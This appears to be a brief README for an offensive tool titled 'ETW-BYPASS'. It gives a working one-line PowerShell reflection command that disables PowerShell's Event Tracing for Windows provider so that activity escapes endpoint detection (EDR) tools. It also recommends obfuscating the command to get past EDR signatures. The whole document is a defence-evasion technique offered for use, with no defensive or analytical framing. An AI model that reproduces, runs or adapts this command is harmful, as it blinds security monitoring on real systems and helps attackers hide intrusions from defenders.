# ETW-BYPASS

This script perform ETW-Bypass to avoid EDR detection

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

- This is caught by most of EDR's with it's signature so perform some obfuscation to get around it
